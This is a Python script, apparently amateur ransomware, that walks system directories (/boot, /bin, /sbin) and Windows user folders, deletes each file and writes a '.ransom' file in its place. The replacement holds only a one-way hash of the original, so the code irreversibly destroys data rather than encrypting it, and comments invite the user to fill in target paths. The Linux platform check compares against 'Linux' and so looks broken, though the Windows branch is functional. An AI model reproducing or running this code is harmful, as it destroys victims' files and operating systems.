import os
import hashlib
import socket
import glob
import requests
import sys
#  import pyaes optional library
class Ransom:
    path_dicts = {  #  here is the targets directories
        "bin" : "/bin",
        "sbin" : "/sbin"
    }
    path_boot = { #  here is the boot dict
        "boot" : "/boot"
    }
    user_path = os.getenv("HOMEPATH")
    windows_paths = {
        "test" : f"E://testes/ransom",  # remove this after and replace with whatever you want
        "pathuwant" : "location",  # remove this after and replace with whatever you want
        "example" : f"D:/{user_path}/Desktop",  # remove this after and replace with whatever you want
        "example2": f"D:/{user_path}/Documents",  # remove this after and replace with whatever you want
        "example3": f"D:/Program Files"  # remove this after and replace with whatever you want
                    }
    #self.publicIP = requests.get('https://api.ipify.org').text  api for ip grabber

    def linuxboot_encrypt(self):
        for bins in self.path_boot.values():
            self.arq = ["*"]
            os.chdir(bins)
            # stay in directory
            for files in self.arq:
                for file in glob.glob(files):
                    try:

                        opened = open(file, "rb")
                        dados = opened.read() #  savind file data inside variable
                        opened.close()

                        #  encrypting

                        os.remove(f"{os.getcwd()}/{file}")
                        encripted_data = hashlib.sha512(dados).digest()
                        encripted_data2 = hashlib.md5(encripted_data).digest()

                        #  saving .ransom file

                        newfile_encripted = file + ".ransom"
                        file_encripted = open(newfile_encripted, "wb")
                        file_encripted.write(encripted_data2)
                        file_encripted.close()

                    except IsADirectoryError:
                        continue

    def linux_encrypt(self):
        for linuxpaths in self.path_dicts.values():
            self.arq = ["*"]
            os.chdir(linuxpaths)
            for files in self.arq:
                for file in glob.glob(files):
                    try:

                        opened = open(file, "rb")
                        dados = opened.read() #  saving file data inside variable
                        opened.close()

                        #  encrypting

                        os.remove(f"{os.getcwd()}/{file}")
                        encripted_data = hashlib.sha512(dados).digest()
                        encripted_data2 = hashlib.md5(encripted_data).digest()

                        #  saving .ransom file

                        newfile_encripted = file + ".ransom"
                        file_encripted = open(newfile_encripted, "wb")
                        file_encripted.write(encripted_data2)
                        file_encripted.close()

                    except IsADirectoryError:
                        continue
                    except NotADirectoryError:
                        continue
                    except:
                        print("oh no!")
                        continue

    def windows_encrypt(self):
        for windowspath in self.windows_paths.values():
            self.arq = ["*"]
            os.chdir(windowspath)
            dirs = os.listdir()
            location = os.getcwd()
            for dir in dirs:
                path_dir = f"{location}/{dir}"
                os.chdir(path_dir)
                for files in self.arq:
                    for file in glob.glob(files):
                            try:

                                opened = open(file, "rb")
                                dados = opened.read() #  Saving file data inside variable
                                opened.close()

                                #  encrypting

                                os.remove(f"{os.getcwd()}/{file}")
                                encripted_data = hashlib.sha512(dados).digest()
                                encripted_data2 = hashlib.md5(encripted_data).digest()

                                #  saving .ransom file

                                newfile_encripted = file + ".ransom"
                                file_encripted = open(newfile_encripted, "wb")
                                file_encripted.write(encripted_data2)
                                file_encripted.close()

                            except IsADirectoryError:
                                continue
                            except NotADirectoryError:
                                continue
                            except:
                                print("oh no!")
                                continue


if __name__ == "__main__":
    crypt = Ransom()
    if sys.platform == "Linux":  # If os is special, remove this if
        crypt.linuxboot_encrypt()
        crypt.linux_encrypt()
    if os.name == "nt":
        crypt.windows_encrypt()

